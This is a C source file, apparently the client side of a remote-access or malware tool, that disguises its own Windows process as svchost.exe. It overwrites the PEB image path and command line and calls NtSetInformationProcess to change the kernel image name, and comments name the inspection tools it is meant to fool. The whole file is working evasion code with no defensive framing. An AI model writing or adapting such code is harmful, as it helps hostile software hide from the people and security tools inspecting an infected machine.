/*
 * client/spoof.c  –  Process-identity spoofing implementation
 * ============================================================
 * Implements the three routines declared in spoof.h.
 * All functions are silent no-ops on failure.
 */

#include "spoof.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>
#include <winternl.h>
#include <string.h>

/* Strings written into the PEB */
#define SPOOF_IMAGE   L"C:\\Windows\\System32\\svchost.exe"
#define SPOOF_CMDLINE L"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule"


/* ── spoof_peb ───────────────────────────────────────────────────────────── */
/*
 * Overwrites PEB ProcessParameters.ImagePathName and .CommandLine so tools
 * that read those fields (Task Manager command-line column, Process Hacker
 * Properties > Image, Sysinternals ProcExp) see a benign svchost.exe path.
 */
void spoof_peb(void)
{
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
#else
    PEB *peb = (PEB *)__readfsdword(0x30);
#endif

    RTL_USER_PROCESS_PARAMETERS *pp = peb->ProcessParameters;

    static WCHAR sImage[]   = SPOOF_IMAGE;
    static WCHAR sCmdline[] = SPOOF_CMDLINE;

    pp->ImagePathName.Buffer        = sImage;
    pp->ImagePathName.Length        = (USHORT)(wcslen(sImage) * sizeof(WCHAR));
    pp->ImagePathName.MaximumLength = pp->ImagePathName.Length + sizeof(WCHAR);

    pp->CommandLine.Buffer        = sCmdline;
    pp->CommandLine.Length        = (USHORT)(wcslen(sCmdline) * sizeof(WCHAR));
    pp->CommandLine.MaximumLength = pp->CommandLine.Length + sizeof(WCHAR);
}


/* ── spoof_kernel_image ──────────────────────────────────────────────────── */
/*
 * Calls NtSetInformationProcess with information class 49
 * (ProcessImageFileName / ProcessImageFileNameWin32) to replace the
 * kernel-side image-name string.  This is the value that Process Hacker
 * reads for its "Image" column via NtQueryInformationProcess.
 *
 * Works on Vista+, user-mode only.  Silently returns on failure.
 */
void spoof_kernel_image(void)
{
    typedef NTSTATUS (NTAPI *NtSetInfoProcess_t)(HANDLE, ULONG, PVOID, ULONG);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    NtSetInfoProcess_t pNtSIP = (NtSetInfoProcess_t)
        GetProcAddress(hNtdll, "NtSetInformationProcess");
    if (!pNtSIP) return;

    static WCHAR wPath[] = SPOOF_IMAGE;  /* writable; kernel may NUL-terminate */
    UNICODE_STRING us;
    us.Length        = (USHORT)(wcslen(wPath) * sizeof(WCHAR));
    us.MaximumLength = us.Length + sizeof(WCHAR);
    us.Buffer        = wPath;

    /* class 49 = ProcessImageFileName */
    pNtSIP(GetCurrentProcess(), 49, &us, (ULONG)sizeof(us));
}


/* ── unlink_self_from_ldr ────────────────────────────────────────────────── */
/*
 * Stub.  LDR pointer arithmetic proved version-sensitive and caused crashes
 * on some Windows 11 builds.  The PEB + kernel spoof above already cover the
 * most important inspection vectors.
 */
void unlink_self_from_ldr(void) { /* intentionally empty */ }
